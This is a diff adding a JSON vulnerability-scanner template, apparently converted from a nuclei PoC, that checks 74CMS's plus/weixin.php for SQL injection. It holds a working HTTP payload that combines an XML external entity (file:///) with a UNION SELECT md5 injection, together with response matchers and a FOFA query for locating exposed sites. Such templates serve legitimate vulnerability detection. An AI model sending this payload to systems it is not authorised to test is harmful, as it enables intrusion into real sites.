@@ -1,0 +1,146 @@
+{
+  "id": "74cms-weixin-sqli",
+  "name": "74CMS weixin.php - SQL Injection",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "There is a libxml_disable_entity_loader function to prevent XML eXternal Entity Injection, but this function needs to be customized by the user. If the user does not customize it, there will be no filtering, which leads to SQL injection vulnerabilities.\n",
+  "references": [
+    "https://cn-sec.com/archives/25900.html"
+  ],
+  "tags": [
+    "74cms",
+    "weixin",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"骑士-74CMS\""
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /plus/weixin.php?signature\u003dda39a3ee5e6b4b0d3255bfef95601890afd80709\u0026timestamp\u003d\u0026nonce\u003d HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\"?\u003e\u003c!DOCTYPE copyright [\u003c!ENTITY test SYSTEM \"file:///\"\u003e]\u003e\u003cxml\u003e\u003cToUserName\u003e\u0026test;\u003c/ToUserName\u003e\u003cFromUserName\u003e1111\u003c/FromUserName\u003e\u003cMsgType\u003e123\u003c/MsgType\u003e\u003cFuncFlag\u003e3\u003c/FuncFlag\u003e\u003cContent\u003e1%\u0027 union select md5({{num}})#\u003c/Content\u003e\u003c/xml\u003e\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{{md5(num)}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "74cms-weixin-sqli",
+    "info": {
+      "name": "74CMS weixin.php - SQL Injection",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "There is a libxml_disable_entity_loader function to prevent XML eXternal Entity Injection, but this function needs to be customized by the user. If the user does not customize it, there will be no filtering, which leads to SQL injection vulnerabilities.\n",
+      "reference": [
+        "https://cn-sec.com/archives/25900.html"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"骑士-74CMS\""
+      },
+      "tags": "74cms,weixin,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /plus/weixin.php?signature\u003dda39a3ee5e6b4b0d3255bfef95601890afd80709\u0026timestamp\u003d\u0026nonce\u003d HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\"?\u003e\u003c!DOCTYPE copyright [\u003c!ENTITY test SYSTEM \"file:///\"\u003e]\u003e\u003cxml\u003e\u003cToUserName\u003e\u0026test;\u003c/ToUserName\u003e\u003cFromUserName\u003e1111\u003c/FromUserName\u003e\u003cMsgType\u003e123\u003c/MsgType\u003e\u003cFuncFlag\u003e3\u003c/FuncFlag\u003e\u003cContent\u003e1%\u0027 union select md5({{num}})#\u003c/Content\u003e\u003c/xml\u003e\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{{md5(num)}}"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
